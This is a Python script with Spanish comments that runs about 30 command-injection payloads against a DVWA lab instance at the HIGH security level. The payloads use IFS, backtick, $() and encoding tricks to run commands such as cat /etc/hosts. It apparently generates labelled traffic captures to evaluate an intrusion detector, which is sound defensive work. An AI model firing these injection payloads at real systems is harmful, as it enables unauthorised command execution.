import requests
import time
import random

BASE_URL = "http://192.168.20.10"
LOGIN_URL = f"{BASE_URL}/login.php"
CREDENCIALES = {"username": "admin", "password": "password", "Login": "Login"}
PAUSA = 0.5

# DISTINTOS a todos los scripts exec anteriores
PAYLOADS_EXEC_EVAL_HIGH = [
    # IFS distintos
    "127.0.0.1${IFS}cat${IFS}/etc/hosts",
    "127.0.0.1${IFS}uname${IFS}-r",
    "127.0.0.1${IFS}hostname",
    "127.0.0.1${IFS}df${IFS}-h",
    "127.0.0.1${IFS}free${IFS}-m",
    # Backticks distintos
    "127.0.0.1`cat /etc/hosts`",
    "127.0.0.1`uname -r`",
    "127.0.0.1`hostname`",
    "127.0.0.1`df -h`",
    # $() distintos
    "127.0.0.1$(cat /etc/hosts)",
    "127.0.0.1$(uname -r)",
    "127.0.0.1$(hostname)",
    "127.0.0.1$(df -h)",
    "127.0.0.1$(free -m)",
    # Codificacion distinta
    "127.0.0.1%3Bhostname",
    "127.0.0.1%3Buname%20-r",
    "127.0.0.1%7Chostname",
    "127.0.0.1%7Cuname%20-r",
    # Variables de entorno distintas
    "127.0.0.1;echo $HOSTNAME",
    "127.0.0.1;echo $LOGNAME",
    "127.0.0.1;echo $TERM",
    "127.0.0.1;echo $LANG",
    "127.0.0.1;echo $PWD",
    # Glob distinto
    "127.0.0.1;/???/hostname",
    "127.0.0.1;/???/uname",
    "127.0.0.1;/usr/bin/hostname",
    # Concatenacion distinta
    "127.0.0.1;h'o's't'n'a'm'e",
    "127.0.0.1;un''ame",
    # Here-string distinto
    "127.0.0.1;bash<<<hostname",
    "127.0.0.1;bash<<<'uname -r'",
]

def login(session):
    r = session.get(LOGIN_URL)
    token = None
    for line in r.text.split('\n'):
        if 'user_token' in line and 'value' in line:
            try:
                token = line.split('value=')[1].split("'")[1]
                break
            except:
                pass
    if token:
        CREDENCIALES['user_token'] = token
    r = session.post(LOGIN_URL, data=CREDENCIALES)
    if "Login failed" in r.text:
        print("ERROR: No se pudo hacer login en DVWA")
        return False
    print("Login correcto en DVWA")
    return True

def ataque_exec_eval_high(session):
    print("\n[*] Iniciando ataques Command Injection HIGH (evaluacion)...")
    payloads = PAYLOADS_EXEC_EVAL_HIGH.copy()
    random.shuffle(payloads)
    ok = 0
    for payload in payloads:
        try:
            r = session.post(f"{BASE_URL}/vulnerabilities/exec/",
                             data={"ip": payload, "Submit": "Submit"})
            print(f"  EXEC_EVAL_H | {payload[:45]:<45} | status: {r.status_code}")
            ok += 1
            time.sleep(PAUSA)
        except Exception as e:
            print(f"  ERROR: {e}")
    print(f"[+] Command Injection High evaluacion completado: {ok}/{len(payloads)} peticiones")

if __name__ == "__main__":
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
    print("="*60)
    print("  EVALUACION: COMMAND INJECTION — NIVEL HIGH")
    print("  Etiqueta real: 'exec'")
    print("  !! NO subir el pcap a Elasticsearch !!")
    print("  Guardarlo como: evaluacion_exec_high.pcap")
    print("  AVISO: Asegurate de que DVWA esta en nivel HIGH")
    print("="*60)
    input("\nPulsa ENTER cuando tcpdump este corriendo...")
    if not login(session):
        exit(1)
    ataque_exec_eval_high(session)
    print("\n" + "="*60)
    print("  COMPLETADO. Guarda el pcap como: evaluacion_exec_high.pcap")
    print("="*60)
